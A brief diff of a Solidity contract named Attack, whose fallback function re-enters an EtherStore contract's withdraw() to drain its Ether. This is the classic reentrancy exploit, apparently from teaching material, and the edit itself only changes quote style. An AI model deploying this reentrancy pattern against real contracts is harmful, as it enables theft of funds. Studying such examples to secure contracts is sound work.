@@ -15,7 +15,7 @@ contract Attack {
     fallback() external payable {
         if (address(etherStore).balance >= AMOUNT) {
             (bool ok,) = etherStore.call(abi.encodeWithSignature("withdraw()"));
-            require(ok, "Failed to withdraw Ether from EtherStore");
+            require(ok, 'Failed to withdraw Ether from EtherStore');
         }
     }
 
